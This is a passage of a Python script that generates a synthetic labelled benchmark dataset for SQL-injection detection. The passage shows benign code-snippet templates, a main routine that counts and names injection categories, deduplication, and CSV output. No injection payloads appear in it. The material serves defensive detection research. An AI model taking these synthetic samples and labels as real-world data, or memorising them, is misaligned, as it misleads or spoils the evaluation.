                f"query = f'SELECT {{{c}}} FROM {{{t}}} WHERE id = {{{v}}}'",
                f"cursor.execute('INSERT INTO {t}({c}) VALUES (%s)', ('{rand_str(5)}',))",
                f"{v} = db.session.query({t.title()}).filter_by({c}='{rand_str(4)}').all()",
                f"# SELECT {c} FROM {t} -- TODO: add WHERE clause",
            ])
        elif kind == 'js_dyn':
            ep = random.choice(js_endpoints)
            s = random.choice([
                f"const {random.choice(py_vars)} = await fetch('{ep}/{rand_int(1, 999)}');",
                f"app.get('{ep}/:id', async (req, res) => {{ const id = req.params.id; }});",
                f"router.delete('{ep}/{rand_int(1, 999)}', auth, controller.remove);",
                f"const data = await axios.post('{ep}', {{ name: '{random.choice(FIRST_NAMES)}' }});",
                f"console.log(`Fetching {ep}/${{id}}...`);",
            ])
        elif kind == 'sql_comment_dyn':
            s = random.choice([
                f"-- TODO: optimize query for {random.choice(py_tables)} table [{rand_alnum(6)}]",
                f"/* Author: {random.choice(FIRST_NAMES)}, Date: 2025-{rand_int(1,12):02d}-{rand_int(1,28):02d} */",
                f"# Ticket #{rand_int(1000, 99999)}: fix {random.choice(py_tables)} query",
                f"-- Migration {rand_int(1,100):03d}: add column {random.choice(py_cols)} to {random.choice(py_tables)}",
            ])
        elif kind == 'config_dyn':
            s = random.choice([
                f"max_connections = {rand_int(10, 500)}",
                f"timeout = {rand_int(5, 120)}",
                f"host = '{rand_str(6)}.{random.choice(['com', 'net', 'io', 'dev'])}'",
                f"port = {random.choice([3306, 5432, 6379, 27017, 8080, 9200])}",
                f"database = '{rand_str(random.randint(4, 10))}'",
                f"LOG_LEVEL = '{random.choice(['debug', 'info', 'warning', 'error'])}'",
                f"CACHE_TTL = {rand_int(60, 86400)}",
                f"MAX_RETRIES = {rand_int(1, 10)}",
            ])
        elif kind == 'shell_dyn':
            s = random.choice([
                f"grep -r '{random.choice(py_cols)}' src/{random.choice(py_tables)}/",
                f"git log --since='{2025}-{rand_int(1,12):02d}-{rand_int(1,28):02d}' --oneline",
                f"docker exec -it {rand_str(6)} psql -U {rand_str(4)} -d {rand_str(5)}",
                f"curl -X GET http://localhost:{random.choice([3000, 5000, 8000, 8080])}{random.choice(js_endpoints)}",
                f"pip install {rand_str(random.randint(4, 12))}=={rand_int(1, 5)}.{rand_int(0, 20)}.{rand_int(0, 10)}",
            ])
        elif kind == 'python_orm':
            t = random.choice(py_tables).title()
            c = random.choice(py_cols)
            s = random.choice([
                f"{t}.objects.filter({c}__gt={rand_int(1, 100)}).count()",
                f"session.query({t}).join('{random.choice(py_tables)}').limit({rand_int(10, 100)})",
                f"{t}.objects.exclude({c}__isnull=True).values_list('{random.choice(py_cols)}', flat=True)",
                f"{t}.objects.create({c}='{rand_str(5)}', {random.choice(py_cols)}={rand_int(1, 100)})",
            ])
        elif kind == 'variable_names':
            s = random.choice([
                f"SELECT_QUERY = 'query_{rand_int(1, 999)}'",
                f"drop_count = {rand_int(0, 100)}",
                f"union_result = set_{rand_str(4)} | set_{rand_str(4)}",
                f"insert_position = {rand_int(0, 50)}",
                f"delete_flag_{rand_str(3)} = {random.choice(['True', 'False'])}",
                f"update_interval_{rand_int(1, 10)} = {rand_int(100, 10000)}",
                f"ALTER_MODE = '{random.choice(['strict', 'permissive', 'auto'])}'",
                f"TABLE_PREFIX = '{rand_str(random.randint(2, 6))}_'",
            ])

        if random.random() < 0.1:
            s = '  ' + s  # indentation
        if random.random() < 0.1:
            s = s + f"  # line {rand_int(1, 500)}"
        samples.append(s)
    return [(s, 'safe_code') for s in samples]


# ═══════════════════════════════════════════════════════════════════
# MAIN GENERATION
# ═══════════════════════════════════════════════════════════════════

def generate_massive_dataset() -> Tuple[List[str], List[int], List[str]]:
    """Generate the full 100k+ test dataset.

    Returns:
        texts: list of input strings
        labels: list of 0/1 labels
        categories: list of category names
    """

    texts = []
    labels = []
    categories = []

    # === SQL INJECTION SAMPLES (~50,000) ===
    print("Generating SQL injection samples...")

    sqli_generators = [
        (gen_boolean_based,       7000,  "Boolean-based"),
        (gen_union_based,         6000,  "UNION-based"),
        (gen_time_based,          5000,  "Time-based blind"),
        (gen_stacked_queries,     6000,  "Stacked queries"),
        (gen_error_based,         4000,  "Error-based"),
        (gen_comment_truncation,  3000,  "Comment truncation"),
        (gen_out_of_band,         2500,  "Out-of-band"),
        (gen_os_command,          2500,  "OS command"),
        (gen_stored_procedures,   2500,  "Stored procedures"),
        (gen_second_order,        2500,  "Second-order"),
        (gen_advanced_blind,      4000,  "Advanced blind"),
        (gen_schema_enumeration,  2500,  "Schema enumeration"),
        (gen_polyglot,            1500,  "Polyglot"),
        (gen_obfuscated,         12000,  "Obfuscated"),
    ]

    for gen_fn, count, name in sqli_generators:
        start = time.time()
        samples = gen_fn(count)
        elapsed = time.time() - start
        for text, cat in samples:
            texts.append(text)
            labels.append(1)
            categories.append(cat)
        print(f"  {name}: {len(samples):,} samples ({elapsed:.1f}s)")

    # === SAFE SAMPLES (~50,000) ===
    print("\nGenerating safe samples...")

    safe_generators = [
        (gen_safe_names,            10000,  "Names (incl. apostrophes)"),
        (gen_safe_emails,            7000,  "Emails"),
        (gen_safe_ids,               7000,  "IDs/UUIDs/Dates/IPs"),
        (gen_safe_sentences,        10000,  "SQL-keywords in text"),
        (gen_safe_json,              6000,  "JSON/API tokens"),
        (gen_safe_paths,             5000,  "URLs/Paths"),
        (gen_safe_quotes,            6000,  "Quotes (contractions)"),
        (gen_safe_edge_cases,        5000,  "Edge cases"),
        (gen_safe_nosql_ldap_xpath,  5000,  "NoSQL/LDAP/XPath"),
        (gen_safe_code_snippets,     5000,  "Code snippets"),
    ]

    for gen_fn, count, name in safe_generators:
        start = time.time()
        samples = gen_fn(count)
        elapsed = time.time() - start
        for text, cat in samples:
            texts.append(text)
            labels.append(0)
            categories.append(cat)
        print(f"  {name}: {len(samples):,} samples ({elapsed:.1f}s)")

    return texts, labels, categories


def main():
    total_start = time.time()
    print("=" * 70)
    print("Massive Test Dataset Generator (100k+)")
    print("For VDCNN Benchmark — SQL Injection Detection")
    print("=" * 70)

    texts, labels, categories = generate_massive_dataset()

    # Deduplicate (preserve category)
    seen = set()
    unique_data = []
    for t, l, c in zip(texts, labels, categories):
        if t not in seen:
            seen.add(t)
            unique_data.append((t, l, c))

    print(f"\nTotal before dedup: {len(texts):,}")
    print(f"Total after dedup:  {len(unique_data):,}")
    print(f"Duplicates removed: {len(texts) - len(unique_data):,}")

    # Shuffle
    random.shuffle(unique_data)

    texts_u, labels_u, cats_u = zip(*unique_data) if unique_data else ([], [], [])

    # Stats
    n_sqli = sum(1 for l in labels_u if l == 1)
    n_safe = sum(1 for l in labels_u if l == 0)
    print(f"\nInjection samples: {n_sqli:,}")
    print(f"Safe samples:      {n_safe:,}")
    print(f"Total:             {len(labels_u):,}")
    print(f"Balance ratio:     {n_sqli / len(labels_u):.2%} injection")

    # Category breakdown
    cat_counts = {}
    for c, l in zip(cats_u, labels_u):
        key = f"{'INJ' if l == 1 else 'SAFE'}: {c}"
        cat_counts[key] = cat_counts.get(key, 0) + 1

    print("\nCategory breakdown:")
    for cat in sorted(cat_counts.keys()):
        print(f"  {cat}: {cat_counts[cat]:,}")

    # Write CSV
    OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

    with open(OUTPUT_FILE, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['text', 'label', 'category'])
        for t, l, c in zip(texts_u, labels_u, cats_u):
            writer.writerow([t, l, c])

    total_time = time.time() - total_start
    file_size_mb = OUTPUT_FILE.stat().st_size / (1024 * 1024)

    print(f"\nDataset saved to: {OUTPUT_FILE}")
    print(f"File size:        {file_size_mb:.1f} MB")
    print(f"Generation time:  {total_time:.1f}s")
    print("=" * 70)


if __name__ == '__main__':
    main()
